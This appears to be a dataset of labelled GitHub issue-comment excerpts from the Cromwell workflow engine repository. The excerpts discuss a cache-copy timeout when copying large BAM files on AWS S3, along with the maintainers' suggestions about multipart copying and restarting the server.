/call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to; > s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488; > 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u; > nmerged.bam) — You are receiving this because you are subscribed to this; > thread. Reply to this email directly, view it on GitHub <#5977; > <https://github.com/broadinstitute/cromwell/issues/5977>>, or unsubscribe; > https://github.com/notifications/unsubscribe-auth/AF2E6EMWLDPLNV7UM35OWWLSMNWFNANCNFS",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726473055
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726473055:2102,Performance,Cache,Cache,2102," improvements that have recently been merged into dev; > and should appear in the next release version (or you could build from; > source) v52+ requires a new AWS configuration. Instructions are in; > https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > … <#m_3227077625045957240_>; > On Sat, Oct 24, 2020 at 8:27 PM Luyu *@*.***> wrote: Hi, I got a timeout; > exception during cache copying on AWS S3. The cache file size is 133GB.; > Given the file size, more time should be allowed for cache copying. Is; > there any config option that can tune this? Thank you in advance for any; > suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure; > copying cache results for job; > BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo; > FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out; > waiting for a response to copy s3://xxxxx/cromwell-execution/Germ; > line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136; > /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to; > s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488; > 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u; > nmerged.bam) — You are receiving this because you are subscribed to this; > thread. Reply to this email directly, view it on GitHub <#5977; > <https://github.com/broadinstitute/cromwell/issues/5977>>, or unsubscribe; > https://github.com/notifications/unsubscribe-auth/AF2E6EMWLDPLNV7UM35OWWLSMNWFNANCNFSM4S56ELLQ; > .; >; > —; > You are receiving this because you commented.; >; >; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-725311491>,; > or unsubscribe; > <https://github.com/notifica",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726473055
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726473055:2639,Performance,cache,cacheCopy,2639," the next release version (or you could build from; > source) v52+ requires a new AWS configuration. Instructions are in; > https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > … <#m_3227077625045957240_>; > On Sat, Oct 24, 2020 at 8:27 PM Luyu *@*.***> wrote: Hi, I got a timeout; > exception during cache copying on AWS S3. The cache file size is 133GB.; > Given the file size, more time should be allowed for cache copying. Is; > there any config option that can tune this? Thank you in advance for any; > suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure; > copying cache results for job; > BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo; > FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out; > waiting for a response to copy s3://xxxxx/cromwell-execution/Germ; > line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136; > /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to; > s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488; > 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u; > nmerged.bam) — You are receiving this because you are subscribed to this; > thread. Reply to this email directly, view it on GitHub <#5977; > <https://github.com/broadinstitute/cromwell/issues/5977>>, or unsubscribe; > https://github.com/notifications/unsubscribe-auth/AF2E6EMWLDPLNV7UM35OWWLSMNWFNANCNFSM4S56ELLQ; > .; >; > —; > You are receiving this because you commented.; >; >; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-725311491>,; > or unsubscribe; > <https://github.com/notifications/unsubscribe-auth/AF2E6EJEL23DXZQ4G3JVNQ3SPJKNNANCNFSM4S56ELLQ>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726473055
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726473055:1028,Safety,timeout,timeout,1028,"size is the problem. Does the issue persist after restarting the server? I committed a change to; the develop branch a few weeks ago that does a better job of cleaning up; the copying resources. If the restart solves the problem then you may want; to build from the develop branch until the next release is sent out. Also, is the bucket containing the source file the same bucket as the; workflow bucket? If not, are they in the same region?. On Wed, Nov 11, 2020 at 4:28 AM Luyu <notifications@github.com> wrote:. > Hi,; >; > The improved multipart copying (api: CreateMultipartUpload) doesn't work; > for me. The cromwell server always checks the existence of the cached file; > before the copying finishes. In Cromwell v51 and before, some small files; > <100GB were able to be successfully cached. However, with Cromwell v53,; > even a 6GB result file got a problem of caching and has to rerun. Is there; > any way to prevent the timeout of the actor?; >; > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded,; > multipart copies to improve the size of results that may be cached. There; > are also additional improvements that have recently been merged into dev; > and should appear in the next release version (or you could build from; > source) v52+ requires a new AWS configuration. Instructions are in; > https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > … <#m_3227077625045957240_>; > On Sat, Oct 24, 2020 at 8:27 PM Luyu *@*.***> wrote: Hi, I got a timeout; > exception during cache copying on AWS S3. The cache file size is 133GB.; > Given the file size, more time should be allowed for cache copying. Is; > there any config option that can tune this? Thank you in advance for any; > suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure; > copying cache results for job; > BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo; > FastqAndBwaMem:0:1 (TimeoutExcepti",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726473055
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726473055:1628,Safety,timeout,timeout,1628,"t copying (api: CreateMultipartUpload) doesn't work; > for me. The cromwell server always checks the existence of the cached file; > before the copying finishes. In Cromwell v51 and before, some small files; > <100GB were able to be successfully cached. However, with Cromwell v53,; > even a 6GB result file got a problem of caching and has to rerun. Is there; > any way to prevent the timeout of the actor?; >; > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded,; > multipart copies to improve the size of results that may be cached. There; > are also additional improvements that have recently been merged into dev; > and should appear in the next release version (or you could build from; > source) v52+ requires a new AWS configuration. Instructions are in; > https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > … <#m_3227077625045957240_>; > On Sat, Oct 24, 2020 at 8:27 PM Luyu *@*.***> wrote: Hi, I got a timeout; > exception during cache copying on AWS S3. The cache file size is 133GB.; > Given the file size, more time should be allowed for cache copying. Is; > there any config option that can tune this? Thank you in advance for any; > suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure; > copying cache results for job; > BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo; > FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out; > waiting for a response to copy s3://xxxxx/cromwell-execution/Germ; > line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136; > /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to; > s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488; > 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cac",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726473055
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726473055:2080,Safety,Timeout,TimeoutException,2080," improvements that have recently been merged into dev; > and should appear in the next release version (or you could build from; > source) v52+ requires a new AWS configuration. Instructions are in; > https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > … <#m_3227077625045957240_>; > On Sat, Oct 24, 2020 at 8:27 PM Luyu *@*.***> wrote: Hi, I got a timeout; > exception during cache copying on AWS S3. The cache file size is 133GB.; > Given the file size, more time should be allowed for cache copying. Is; > there any config option that can tune this? Thank you in advance for any; > suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure; > copying cache results for job; > BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo; > FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out; > waiting for a response to copy s3://xxxxx/cromwell-execution/Germ; > line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136; > /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to; > s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488; > 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u; > nmerged.bam) — You are receiving this because you are subscribed to this; > thread. Reply to this email directly, view it on GitHub <#5977; > <https://github.com/broadinstitute/cromwell/issues/5977>>, or unsubscribe; > https://github.com/notifications/unsubscribe-auth/AF2E6EMWLDPLNV7UM35OWWLSMNWFNANCNFSM4S56ELLQ; > .; >; > —; > You are receiving this because you commented.; >; >; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-725311491>,; > or unsubscribe; > <https://github.com/notifica",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726473055
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726473055:66,Testability,test,testing,66,"This is unusual, I have successfully call cached files of 1 TB in testing; so I don’t know if size is the problem. Does the issue persist after restarting the server? I committed a change to; the develop branch a few weeks ago that does a better job of cleaning up; the copying resources. If the restart solves the problem then you may want; to build from the develop branch until the next release is sent out. Also, is the bucket containing the source file the same bucket as the; workflow bucket? If not, are they in the same region?. On Wed, Nov 11, 2020 at 4:28 AM Luyu <notifications@github.com> wrote:. > Hi,; >; > The improved multipart copying (api: CreateMultipartUpload) doesn't work; > for me. The cromwell server always checks the existence of the cached file; > before the copying finishes. In Cromwell v51 and before, some small files; > <100GB were able to be successfully cached. However, with Cromwell v53,; > even a 6GB result file got a problem of caching and has to rerun. Is there; > any way to prevent the timeout of the actor?; >; > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded,; > multipart copies to improve the size of results that may be cached. There; > are also additional improvements that have recently been merged into dev; > and should appear in the next release version (or you could build from; > source) v52+ requires a new AWS configuration. Instructions are in; > https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > … <#m_3227077625045957240_>; > On Sat, Oct 24, 2020 at 8:27 PM Luyu *@*.***> wrote: Hi, I got a timeout; > exception during cache copying on AWS S3. The cache file size is 133GB.; > Given the file size, more time should be allowed for cache copying. Is; > there any config option that can tune this? Thank you in advance for any; > suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure; > copying cache results for job; > BackendJobDescriptorKey_Comma",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726473055
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726473055:1923,Testability,log,log,1923," of caching and has to rerun. Is there; > any way to prevent the timeout of the actor?; >; > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded,; > multipart copies to improve the size of results that may be cached. There; > are also additional improvements that have recently been merged into dev; > and should appear in the next release version (or you could build from; > source) v52+ requires a new AWS configuration. Instructions are in; > https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > … <#m_3227077625045957240_>; > On Sat, Oct 24, 2020 at 8:27 PM Luyu *@*.***> wrote: Hi, I got a timeout; > exception during cache copying on AWS S3. The cache file size is 133GB.; > Given the file size, more time should be allowed for cache copying. Is; > there any config option that can tune this? Thank you in advance for any; > suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure; > copying cache results for job; > BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo; > FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out; > waiting for a response to copy s3://xxxxx/cromwell-execution/Germ; > line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136; > /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to; > s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488; > 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u; > nmerged.bam) — You are receiving this because you are subscribed to this; > thread. Reply to this email directly, view it on GitHub <#5977; > <https://github.com/broadinstitute/cromwell/issues/5977>>, or unsubscribe; > https://github.com/notifications/unsubscribe-auth/AF2E6EMWLDPLNV7UM35OWWLSMNWFNANCNFS",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726473055
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726476046:1849,Availability,Error,Error,1849,"ell v53, even a 6GB result file got a problem of caching and has to rerun. Is there any way to prevent the timeout of the actor? Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf … <#m_3227077625045957240_> On Sat, Oct 24, 2020 at 8:27 PM Luyu *@*.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136 /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u nmerged.bam) — You are receiving this because you are subscribed to this thread. Reply to this email directly, view it on GitHub <#5977 <#5977>>, or unsubscribe https://github.com/notifications/unsubscribe-auth/AF2E6EMWLDPLNV7UM35OWWLSMNWFNANCNFSM4S56ELLQ . — You are receiving this because you commented. Reply to this email di",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726476046
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726476046:1860,Availability,Failure,Failure,1860,"ell v53, even a 6GB result file got a problem of caching and has to rerun. Is there any way to prevent the timeout of the actor? Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf … <#m_3227077625045957240_> On Sat, Oct 24, 2020 at 8:27 PM Luyu *@*.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136 /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u nmerged.bam) — You are receiving this because you are subscribed to this thread. Reply to this email directly, view it on GitHub <#5977 <#5977>>, or unsubscribe https://github.com/notifications/unsubscribe-auth/AF2E6EMWLDPLNV7UM35OWWLSMNWFNANCNFSM4S56ELLQ . — You are receiving this because you commented. Reply to this email di",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726476046
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726476046:388,Deployability,release,release,388,"> This is unusual, I have successfully call cached files of 1 TB in testing so I don’t know if size is the problem. Does the issue persist after restarting the server? I committed a change to the develop branch a few weeks ago that does a better job of cleaning up the copying resources. If the restart solves the problem then you may want to build from the develop branch until the next release is sent out. Also, is the bucket containing the source file the same bucket as the workflow bucket? If not, are they in the same region?; > […](#); > On Wed, Nov 11, 2020 at 4:28 AM Luyu ***@***.***> wrote: Hi, The improved multipart copying (api: CreateMultipartUpload) doesn't work for me. The cromwell server always checks the existence of the cached file before the copying finishes. In Cromwell v51 and before, some small files <100GB were able to be successfully cached. However, with Cromwell v53, even a 6GB result file got a problem of caching and has to rerun. Is there any way to prevent the timeout of the actor? Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf … <#m_3227077625045957240_> On Sat, Oct 24, 2020 at 8:27 PM Luyu *@*.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726476046
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726476046:1043,Deployability,update,updated,1043,"TB in testing so I don’t know if size is the problem. Does the issue persist after restarting the server? I committed a change to the develop branch a few weeks ago that does a better job of cleaning up the copying resources. If the restart solves the problem then you may want to build from the develop branch until the next release is sent out. Also, is the bucket containing the source file the same bucket as the workflow bucket? If not, are they in the same region?; > […](#); > On Wed, Nov 11, 2020 at 4:28 AM Luyu ***@***.***> wrote: Hi, The improved multipart copying (api: CreateMultipartUpload) doesn't work for me. The cromwell server always checks the existence of the cached file before the copying finishes. In Cromwell v51 and before, some small files <100GB were able to be successfully cached. However, with Cromwell v53, even a 6GB result file got a problem of caching and has to rerun. Is there any way to prevent the timeout of the actor? Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf … <#m_3227077625045957240_> On Sat, Oct 24, 2020 at 8:27 PM Luyu *@*.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out wai",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726476046
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726476046:1268,Deployability,release,release,1268,"aning up the copying resources. If the restart solves the problem then you may want to build from the develop branch until the next release is sent out. Also, is the bucket containing the source file the same bucket as the workflow bucket? If not, are they in the same region?; > […](#); > On Wed, Nov 11, 2020 at 4:28 AM Luyu ***@***.***> wrote: Hi, The improved multipart copying (api: CreateMultipartUpload) doesn't work for me. The cromwell server always checks the existence of the cached file before the copying finishes. In Cromwell v51 and before, some small files <100GB were able to be successfully cached. However, with Cromwell v53, even a 6GB result file got a problem of caching and has to rerun. Is there any way to prevent the timeout of the actor? Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf … <#m_3227077625045957240_> On Sat, Oct 24, 2020 at 8:27 PM Luyu *@*.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-9",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726476046
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726476046:1341,Deployability,configurat,configuration,1341,"aning up the copying resources. If the restart solves the problem then you may want to build from the develop branch until the next release is sent out. Also, is the bucket containing the source file the same bucket as the workflow bucket? If not, are they in the same region?; > […](#); > On Wed, Nov 11, 2020 at 4:28 AM Luyu ***@***.***> wrote: Hi, The improved multipart copying (api: CreateMultipartUpload) doesn't work for me. The cromwell server always checks the existence of the cached file before the copying finishes. In Cromwell v51 and before, some small files <100GB were able to be successfully cached. However, with Cromwell v53, even a 6GB result file got a problem of caching and has to rerun. Is there any way to prevent the timeout of the actor? Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf … <#m_3227077625045957240_> On Sat, Oct 24, 2020 at 8:27 PM Luyu *@*.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-9",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726476046
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726476046:1424,Deployability,Install,Installing,1424,"rce file the same bucket as the workflow bucket? If not, are they in the same region?; > […](#); > On Wed, Nov 11, 2020 at 4:28 AM Luyu ***@***.***> wrote: Hi, The improved multipart copying (api: CreateMultipartUpload) doesn't work for me. The cromwell server always checks the existence of the cached file before the copying finishes. In Cromwell v51 and before, some small files <100GB were able to be successfully cached. However, with Cromwell v53, even a 6GB result file got a problem of caching and has to rerun. Is there any way to prevent the timeout of the actor? Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf … <#m_3227077625045957240_> On Sat, Oct 24, 2020 at 8:27 PM Luyu *@*.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136 /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488 8c0031/call-Tumor_Bam/PreProcess",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726476046
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726476046:1341,Modifiability,config,configuration,1341,"aning up the copying resources. If the restart solves the problem then you may want to build from the develop branch until the next release is sent out. Also, is the bucket containing the source file the same bucket as the workflow bucket? If not, are they in the same region?; > […](#); > On Wed, Nov 11, 2020 at 4:28 AM Luyu ***@***.***> wrote: Hi, The improved multipart copying (api: CreateMultipartUpload) doesn't work for me. The cromwell server always checks the existence of the cached file before the copying finishes. In Cromwell v51 and before, some small files <100GB were able to be successfully cached. However, with Cromwell v53, even a 6GB result file got a problem of caching and has to rerun. Is there any way to prevent the timeout of the actor? Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf … <#m_3227077625045957240_> On Sat, Oct 24, 2020 at 8:27 PM Luyu *@*.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ 